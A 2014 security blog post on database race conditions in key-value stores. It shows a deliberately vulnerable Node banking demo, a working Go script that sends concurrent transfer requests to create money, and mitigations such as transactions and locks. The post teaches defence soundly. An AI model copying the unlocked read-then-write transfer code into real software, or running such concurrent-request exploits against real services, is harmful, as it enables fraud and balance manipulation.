---
date: 2014-06-24 22:35:25 GMT
slug: two-reads-dont-make-a-write
tags: security, node.js
title: Two Reads Don't Make a Write
author: Tom Steele
type: text
---

Key-value data stores are a large part of modern application development, and growing in popularity. Solutions like Riak, LevelDB, MongoDB, etc. give you increased flexibility and development efficiency, as well as other benefits which have been covered and discussed extensively. With the benefits also come weaknesses, or maybe a better word is differences. One of which can result in an incredibly devastating vulnerability. 

Database race conditions can occur no matter what backend solution you choose. Traditional databases support [transactions](http://en.wikipedia.org/wiki/Database_transaction) to prevent them. But most key-value data stores do not have such mechanisms. This is well known, and in many cases is not deal breaker. But it is important to understand when this should be a requirement, or at least when a compensation is needed. 

Rather than a writing a long explanation centered around a theoretical situation I decided to write a quick demo application. Enter [raceybank](https://github.com/tomsteele/raceybank). A little Node application with a LevelDB backend.

This is incredibly simple and somewhat silly, but it demonstrates the issue well. Consider we have a banking application, or maybe we have a store that gives a user credits. Whatever. Let's look at our user model.

~~~~~javascript
module.exports = new dulcimer.Model({
    id: {
        derive: function() {
            return this.key.split('!')[1];
        }
    },
    name: {
        type: 'string',
        required: true
    },
    money: {
        type: 'integer',
        required: true
    }
}, { db: db, name: 'user'});
~~~~~

Pretty straight forward, we have a user with a unique id, a name, and some amount of money. Our application consists of two routes, `GET /users` and `POST /transfer`. There are instructions in the repository so you can follow along at home. Here is the transfer route.


~~~~~javascript
function handleTransfer(request, reply) {
    var to = null;
    var from = null;
    var amount = request.payload.amount;

    if (request.payload.to === request.payload.from) {
        return reply().code(400);
    }

    async.parallel([function (cb) {
        User.get(request.payload.to, function (err, user) {
            if (err) {
                return cb(err);
            }
            to = user;
            return cb();
        });
    }, function (cb) {
        User.get(request.payload.from, function (err, user) {
            if (err) {
                return cb(err);
            }
            from = user;
            return cb();
        });
    }], foundUsers);

    function foundUsers(err) {
        // Something happened or we didnt find the users.
        if (err || !to || !from) {
            return reply().code(404);
        }

        // Validate from has the funds for this transfer.
        if (from.money < amount) {
            return reply().code(403);
        }

        // Transfer the money.
        from.money -= amount;
        to.money += amount;
        async.parallel([function (cb) {
            from.save(function (err) {
                cb(err);
            });
        }, function (cb) {
            to.save(function (err) {
                cb(err);
            });
        }], saveUsers);
    }

    function saveUsers(err) {
        if (err) {
            return reply().code(500);
        }
        return reply();
    }
}
~~~~~

It's a bit of code, but the gist is we read two users from the database, validate the transferrer has the requested amount of funds, decrement from transferrer, increment transferee's funds, and save the user records. Once we have the application started, we can see that some seed data has been initialized by calling `GET /users` (note: you would never want to return this much information, but this is a demo).

~~~~~shell
$ curl http://localhost:3000/users | python -mjson.tool0
[
    {
        "id": "0000000001",
        "money": 100,
        "name": "Alice"
    },
    {
        "id": "0000000002",
        "money": 100,
        "name": "Bob"
    },
    {
        "id": "0000000003",
        "money": 100,
        "name": "Carol"
    }
]
~~~~~

Alice, Bob, and Carol all have 100 something, let's call it dollars, resulting in a total economy of $300. We'll transfer $100 from Alice to Bob, and then attempt to transfer $100 from Alice to Carol.

~~~~~shell
$ curl -i http://localhost:3000/transfer -X POST -d '{"from": "0000000001", "to": "0000000002", "amount": 100}' -H 'Content-Type: application/json'
HTTP/1.1 200 OK
~~~~~

~~~~~shell
$ curl -i http://localhost:3000/transfer -X POST -d '{"from": "0000000001", "to": "0000000003", "amount": 100}' -H 'Content-Type: application/json'
HTTP/1.1 403 Forbidden
~~~~~

The first request succeeds and the second fails because Alice does not have enough money. But we made these requests sequentially, what happens if we make these requests concurrently? I'll show you! Here is some quick Go code to make the magic happen. All it does is make the same two requests, but concurrently in two goroutines.

~~~~~go
package main

import (
    "bytes"
    "log"
    "net/http"
    "sync"
)

func main() {
    req1 := []byte(`{"to": "0000000002", "from": "0000000001", "amount": 100.00}`)
    req2 := []byte(`{"to": "0000000003", "from": "0000000001", "amount": 100.00}`)
    wait := &sync.WaitGroup{}
    wait.Add(2)
    go func(body []byte) {
        defer wait.Done()
        http.Post("http://localhost:3000/transfer", "application/json", bytes.NewReader(body))
    }(req1)
    go func(body []byte) {
        defer wait.Done()
        http.Post("http://localhost:3000/transfer", "application/json", bytes.NewReader(body))
    }(req2)

    wait.Wait()
    log.Println("done")
}
~~~~~

We restart the application to reset our data and run our exploit.

~~~~~shell
$ ./exploit-osx
2014/06/24 15:03:19 done
~~~~~

Check out users balance.

~~~~~shell
curl http://localhost:3000/users | python -mjson.tool
[
    {
        "id": "0000000001",
        "money": 0,
        "name": "Alice"
    },
    {
        "id": "0000000002",
        "money": 200,
        "name": "Bob"
    },
    {
        "id": "0000000003",
        "money": 200,
        "name": "Carol"
    }
]
~~~~~

Carol and Bob both have $200. WE JUST CREATED MONEY. No we're not Midas, we're simply exploiting a race condition. Alice is read twice before the write. So each request instance believes they have the required funds.

This is a traditional example and often used as the argument for why transactions are important. And in a real bank there would be much stricter control and fraud prevention to allow this to go unnoticed. But not everyone is a big bank with unlimited resources, and not every situation will deal in dollars and cents. This could be occur in something of relatively low importance, but still be a bug that could drive you to madness.

How can we prevent this? To me, this depends on the nature of the data being handled. If it's crucial financial data I would opt for a traditional database (there are NoSQL solutions that support transactions as well). If not, or you're already heavily invested in a existing solution, you can apply a lock/mutex around the troublesome operation. A library in Node land to solve this is [lock](https://github.com/dominictarr/lock). There are other mitigations, and some databases offer recommendations or built in mechanisms; investigate what works for you, look for this pattern, and test for it.

